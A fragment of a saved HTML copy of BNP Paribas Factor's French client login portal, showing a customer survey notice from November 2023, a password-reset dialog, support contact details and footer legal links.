<div style="display : inline;color:#0091DE;font-weight:bold;" class="ll" id="LANG_PAS_CODE_SECURITE" bis_skin_checked="1"></div>
<div style="display : inline;" class="ll" id="LANG_OUBLIE_MOT_DE_PASSE" bis_skin_checked="1">Si vous avez oublié votre code secret, </div>
<div style="display : inline;" class="ll" id="LANG_REINIT_VOTRE_MOTPASSE" bis_skin_checked="1"><a href="javascript:void($( '#bloc_reinit_mot_de_passe').dialog('open'));" bis_skin_checked="1">réinitialisez le ici </a></div><br>


<br>
<br>
</div><br>
<br>

<div class="ll" style="font-size: 9px;" bis_skin_checked="1">
<div class="trad" id="LANG_ACCESITE_SECURISE_MSIE5" bis_skin_checked="1">Vous accédez à un site sécurisé optimisé pour le logiciel de navigation Internet Explorer 8, Firefox 20.0 ou Safari 5, et versions suivantes. </div> <br>

<div class="trad" id="LANG_NOTA" bis_skin_checked="1">  </div> 
<div class="trad" id="LANG_POUVOIR_ACC_PAGE_SECURISE" bis_skin_checked="1">  </div> 
<div class="trad" id="LANG_VERSIONS_IE" bis_skin_checked="1">  </div> </div></div>
<div class="decoupe-home-04_" style="height: 480px;" bis_skin_checked="1">
<div id="evt" bis_skin_checked="1"><div style="color:#0091DE; padding: 15px 0px 3px 10px; font-size: 25px; font-weight: bold;" bis_skin_checked="1"><img data-savepage-currentsrc="?/S027_E001/S027_E001_fichier_cosmos_fr/information.jpg" data-savepage-src="/S027_E001/S027_E001_fichier_cosmos_fr/information.jpg" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/4QAWRXhpZgAATU0AKgAAAAgAAAAAAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAAfAB4DASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAABQYHCAP/xAAuEAABAwIDBgUEAwAAAAAAAAABAgMEBREABhIHISIxUXEIExRBsUJhgZGh0fD/xAAYAQACAwAAAAAAAAAAAAAAAAABAwQFBv/EAB8RAAEEAgMBAQAAAAAAAAAAAAMAAQIEBRMREnFRYf/aAAwDAQACEQMRAD8A1nmKtRqPHSpzidXuQge/37YVJmbpkhOhspZSfdHP94Uto1dU5m+WypfDHIaSOlhf5Jxwyw09WZ7EZEhLIdWUpUQVEkC5sB0/WL0FEYwsQnqzVnIFIZxD8TmzmOrU9xCpRW42sXCXk2JHUH/DDvSahHqUNEqOq6FcweYPQ4j2f6tMj1pVNmS23zFSlKVIRo5gHeOuC2yGuqVMmwyolvQHQL8jex+RhVik0gbWbjxNrX3gdxSflv1T3bmzJomfZDrgUGJyQ+0v2PsR3BH8jDL4e2PUpqmYHAXBFT5LKRvJVbUq34sPzinZ/wAnUvOdFVTqkgoUOJl9AGtpXUf1iA1fZNtKy/6mHQqr6invK4gzLLAcHIakE2vbviUC0OzV0Sl1k31KNSnXtb4x7M6EZvrTzldlPyX0qkPLLjqUm/lkk8JPK4FuXbFJ8OFPfnqqdYdSoR9IjtqP1K3FVu27CdkzYZmaoTkLzDIZgQgbrDTgccUOgtuHfGk6BSINCpTFMpsdLEVlOlCU/J6n74OTvCgHQJ+XQx2PI5txW4Zf/9k=">
	<div class="trad" bis_skin_checked="1">Information</div>
</div>
<div class="blabla_home" bis_skin_checked="1">
	<div style="color:#0091DE; padding: 15px 0px 3px 10px; font-size: 15px;" bis_skin_checked="1">
		<div class="trad" bis_skin_checked="1">Madame, Monsieur,</div>
	</div>	
	<div style="color:#0091DE; padding: 15px 0px 3px 10px; font-size: 15px;" bis_skin_checked="1">
		<div class="trad" bis_skin_checked="1">Dans le cadre de l'amélioration continue de nos services, BNP Paribas Factor réalise une enquête de satisfaction auprès de ses clients.</div>
	</div>	
	<div style="color:#0091DE; padding: 15px 0px 3px 10px; font-size: 15px;" bis_skin_checked="1">
		<div class="trad" bis_skin_checked="1">La réalisation de cette étude a été confiée à Ia société la Voix Du Client , afin de garantir l'impartialité dans le recueil et l'analyse des données.</div>
	</div>	
	<div style="color:#0091DE; padding: 15px 0px 3px 10px; font-size: 15px;" bis_skin_checked="1">
		<div class="trad" bis_skin_checked="1">Dans le cadre de cette démarche, vous pourrez être contacté par téléphone au cours du mois de novembre 2023.
			Nous vous serions extrêmement reconnaissants d'accepter de répondre au questionnaire d'une dizaine de minutes qui vous sera proposé.</div>
	</div>	
	<div style="color:#0091DE; padding: 15px 0px 3px 10px; font-size: 15px;" bis_skin_checked="1">
		<div class="trad" bis_skin_checked="1">Nous sommes à votre entière disposition pour répondre à vos questions et vous remercions par avance du temps que vous voudrez accorder à cette enquête.</div>
	</div>	
	<div style="color:#0091DE; padding: 15px 0px 3px 10px; font-size: 15px;" bis_skin_checked="1">	
		<div class="trad" bis_skin_checked="1">Cordialement<br>
			Les équipes BNP Paribas Factor </div>
	</div>
</div></div></div>
<form method="post" action="/factoring/fr/Portail_Connexion.or"><input type="hidden" name="CWW_FORM" value="_fm5">
<input type="hidden" name="CWW_CTX" value="806391160">


<input id="MailToSupport" name="MailToSupport" type="hidden" value="factor.assistancetechniqueclient@bnpparibas.com">
</form><script data-savepage-type="text/javascript" type="text/plain"></script>

<script data-savepage-type="" type="text/plain" language="JavaScript"></script>
<!-- scripts locaux -->
	<script data-savepage-type="" type="text/plain" data-savepage-src="/tra_cosmos_js/BNP/BNPDigitalKeypad.js"></script>
	<script data-savepage-type="" type="text/plain" data-savepage-src="/script_cosmos_js/GOP/Portail_Connexion.js"></script>
	<script data-savepage-type="" type="text/plain" data-savepage-src="/tra_cosmos_js/reinitialisation_mot_de_passe_pc.js"></script>
<!-- /scripts locaux -->
	</div>
<!-- FIN or_content -->



<div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front ui-dialog-buttons ui-draggable" aria-describedby="bloc_reinit_mot_de_passe" style="display: none; border: none; border-radius: initial; box-shadow: rgb(153, 153, 153) 1px 1px 2px;" aria-labelledby="ui-id-1" bis_skin_checked="1"><div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle" style="border-radius: initial; border: none; background: none rgb(0, 171, 122); text-decoration: none; color: rgb(255, 255, 255); font-weight: 900;" bis_skin_checked="1"><span id="ui-id-1" class="ui-dialog-title" style="border-radius: initial; border: none; background: none transparent; text-decoration: none;">Demande d’un nouveau code secret </span><button type="button" class="ui-button ui-corner-all ui-widget ui-button-icon-only ui-dialog-titlebar-close" title="Close" style="border-radius: initial; border: none; background: none transparent; text-decoration: none; color: rgb(255, 255, 255); margin-top: -15px;">🗙</button></div><div id="bloc_reinit_mot_de_passe" style="border-radius: initial; border: none; background: none transparent; text-decoration: none;" class="ui-dialog-content ui-widget-content" bis_skin_checked="1">
<div style="width: 500px; text-align: center; text-decoration: none; color: rgb(124, 187, 0); border-radius: initial; border: none; background: none transparent;" bis_skin_checked="1"><a style="color: rgb(0, 171, 122); border-radius: initial; border: none; background: none transparent; text-decoration: none;" data-savepage-href="/S027_E001/S027_E001_fichier_cosmos_fr/DPN_FR_2022.pdf" href="?/S027_E001/S027_E001_fichier_cosmos_fr/DPN_FR_2022.pdf" target="_blank" bis_skin_checked="1">
<div class="trad" id="LANG_LINK_POPUP_GDPR" style="border-radius: initial; border: none; background: none transparent; text-decoration: none;" bis_skin_checked="1">Politique de protection des données personnelles  </div></a></div>
<p style="border-radius: initial; border: none; background: none transparent; text-decoration: none;">
</p><br style="border-radius: initial; border: none; background: none transparent; text-decoration: none;">

<p style="border-radius: initial; border: none; background: none transparent; text-decoration: none;"></p>
<p style="border-radius: initial; border: none; background: none transparent; text-decoration: none;">
</p><div style="display: inline; border-radius: initial; border: none; background: none transparent; text-decoration: none; text-align: right; padding-right: 20px; width: 200px;" id="LANG_RESETPWD_FIELD_SUBSCRIBENUMBER" class="my_label" bis_skin_checked="1">Numéro d’abonné </div>
<input id="reinit_code_prescripteur" name="reinit_code_prescripteur" type="text" onblur="
" maxlength="25" size="10" style="border-radius: initial; border: 1px solid rgb(0, 171, 122); background: none transparent; text-decoration: none;" value=""><p style="border-radius: initial; border: none; background: none transparent; text-decoration: none;"></p>
<p style="border-radius: initial; border: none; background: none transparent; text-decoration: none;">
</p><div style="display: inline; border-radius: initial; border: none; background: none transparent; text-decoration: none; text-align: right; padding-right: 20px; width: 200px;" id="LANG_RESETPWD_FIELD_EMAIL" class="my_label" bis_skin_checked="1">E-mail </div>
<input id="reinit_telephone" name="reinit_telephone" type="text" onblur="
" maxlength="75" size="10" style="border-radius: initial; border: 1px solid rgb(0, 171, 122); background: none transparent; text-decoration: none;" value=""><p style="border-radius: initial; border: none; background: none transparent; text-decoration: none;"></p>
<p style="border-radius: initial; border: none; background: none transparent; text-decoration: none;"><br style="border-radius: initial; border: none; background: none transparent; text-decoration: none;">

</p><div style="display: inline; border-radius: initial; border: none; background: none transparent; text-decoration: none;" id="En cas de difficulté, vous pouvez envoyer un e-mail au <a href='mailto:factor.assistancetechniqueclient@bnpparibas.com'>Service Assistance Technique Client</a> ou appeler le +33 4 65 06 00 10 " bis_skin_checked="1">En cas de difficulté, vous pouvez envoyer un e-mail au <a href="mailto:factor.assistancetechniqueclient@bnpparibas.com" style="border-radius: initial; border: none; background: none transparent; text-decoration: none; color: rgb(0, 171, 122);" bis_skin_checked="1">Service Assistance Technique Client</a> ou appeler le +33 4 65 06 00 10 </div><p style="border-radius: initial; border: none; background: none transparent; text-decoration: none;"></p></div><div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix" style="border-radius: initial; border: none; background: none transparent; text-decoration: none;" bis_skin_checked="1"><div class="ui-dialog-buttonset" style="border-radius: initial; border: none; background: none transparent; text-decoration: none;" bis_skin_checked="1"><button type="button" id="bp_reinitialiser_annuler" class="ui-button ui-corner-all ui-widget" style="border-radius: initial; border: 1px solid rgb(0, 171, 122); background: none; text-decoration: none; color: rgb(0, 171, 122); font-weight: 900;">Annuler </button><button type="button" id="bp_reinitialiser_valider" class="ui-button ui-corner-all ui-widget" style="border-radius: initial; border: 1px solid rgb(0, 171, 122); background: none; text-decoration: none; color: rgb(0, 171, 122); font-weight: 900;">Demander un nouveau code </button></div></div></div></div><div class="footer_" id="pied" style="position: relative; width: 450px; margin-left: auto; margin-right: auto;" bis_skin_checked="1"><table id="tbdatapied" border="0" cellspacing="0" cellpadding="0" align="center"><tbody><tr><td><div id="LANG_TOUSDROITS" class="trad" bis_skin_checked="1">Tous droits réservés </div> © 2016 ~ <div id="LANG_BNPPARIBASFACTOR" class="trad" bis_skin_checked="1">BNP Paribas Factor S.A </div> ~ <div id="LANG_LINK_POPUP_GDPR" class="trad" bis_skin_checked="1"><a data-savepage-href="/S027_E001/S027_E001_fichier_cosmos_fr/DPN_FR_2022.pdf" href="?/S027_E001/S027_E001_fichier_cosmos_fr/DPN_FR_2022.pdf" title="" target="_blank" bis_skin_checked="1">Politique de protection des données personnelles  </a> </div> ~ <div class="trad" id="LANG_MENTIONS_LEGALES" bis_skin_checked="1"><a data-savepage-href="/S027_E001/S027_E001_fichier_cosmos_fr/Mentions_legales_Internet_BNPP_Factor.pdf" href="?/S027_E001/S027_E001_fichier_cosmos_fr/Mentions_legales_Internet_BNPP_Factor.pdf" target="_blank" bis_skin_checked="1">Mentions légales </a></div> ~ <div id="LANG_LINK_COOKIES" class="trad" bis_skin_checked="1"><a data-savepage-href="/S027_E001/S027_E001_fichier_cosmos_fr/CP_2021_fr-FR_Politique-Cookies.pdf" href="?/S027_E001/S027_E001_fichier_cosmos_fr/CP_2021_fr-FR_Politique-Cookies.pdf" title="" target="_blank" bis_skin_checked="1">Politique Cookies </a> </div><br><div id="LANG_PROBCONNEXIONCONTACTNOTRE" class="trad" bis_skin_checked="1">Pour toutes questions relatives au site, contactez notre </div><div class="trad" id="LANG_WEBMASTER" bis_skin_checked="1"><a href="javascript:change_page('NL_Transverse.or', 'Contacts', '');" bis_skin_checked="1">Webmaster </a></div></td></tr></tbody></table></div></div></div></body></html>